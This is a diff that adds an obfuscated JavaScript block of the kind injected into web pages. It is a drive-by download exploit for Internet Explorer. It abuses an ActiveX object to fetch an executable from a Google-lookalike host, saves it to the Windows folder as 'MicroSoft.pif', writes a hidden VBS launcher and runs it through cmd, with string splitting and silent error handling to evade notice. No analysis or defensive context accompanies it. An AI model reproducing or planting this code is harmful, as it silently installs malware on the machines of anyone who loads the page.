@@ -1,0 +1,63 @@
+<script language="JavaScript">
+function gn(HU1)
+{
+var Orh2=window["Math"]["random"]()*HU1;
+return'HHQ'+'.Cn'
+}
+try
+{
+var HF,HFs,HFx,WH,WH2;
+HHQ='http://tech.google-serv.cn/down.exe';
+var HQ='MicroSoft.pif';
+var CuteHQ='MicroSoft.vbs';
+var MH=window["document"]["createElement"]("object");
+var G="clsid:";
+var Gs="0-983A-0";
+var Gss="0C04";
+var Gsss="FC29E36";
+var Gx="BD96C";
+var Gxx="556-65A3-11D";
+var CH="Microsoft.X"+"M"+"L"+"H"+"T"+"T"+"P";
+var HH="A"+"d"+"o"+"d"+"b."+"S"+"t"+"r"+"e"+"a"+"m";
+var YH="Shell.";
+var YHs="Application";
+var YHx=YH+YHs;
+var Gx=G+Gx+Gxx+Gs+Gss+Gsss;
+MH["setAttribute"]("classid",Gx);
+var hHf$R6=MH["CreateObject"]("Scripting.FileSystemObject","");
+var H2=MH["CreateObject"](CH,"");
+var TH;
+TH=MH.CreateObject(HH,"");
+TH["type"]=1;
+var VH=hHf$R6["GetSpecialFolder"](0);
+var YHYH;
+YHYH=MH["CreateObject"](YHx,"");
+exp1=hHf$R6["BuildPath"](VH+'\\system32','cmd.exe');
+WH=VH+"\\"+HQ;
+H2.Open("GET",HHQ,0);
+H2["send"]();
+TH["Open"]();
+TH["Write"](H2["responseBody"]);
+TH["SaveToFile"](WH,2);
+TH["Close"]();
+WH2=VH+"\\"+CuteHQ;
+var VHV;
+VHV="Set WH = CreateObject(\"Wscript.";
+HF="Shell\")" + "\n";
+HFs="WH.run \"cmd /c "+WH+"\",vbhide";
+HFx=VHV+HF+HFs;
+TH["type"]=2;
+TH["Open"]();
+TH["WriteText"]=HFx;
+TH["Savetofile"](WH2,2);
+TH["Close"]();
+var HHQs="o";
+var HHQss="p";
+var HHQsss="e";
+var HHQssss="n";
+var HHQx=HHQs+HHQss+HHQsss+HHQssss;
+YHYH["ShelLExeCute"](exp1,' /c '+WH2,"",HHQx,0)
+}
+catch(KfHQ)
+{KfHQ=1}
+</script>
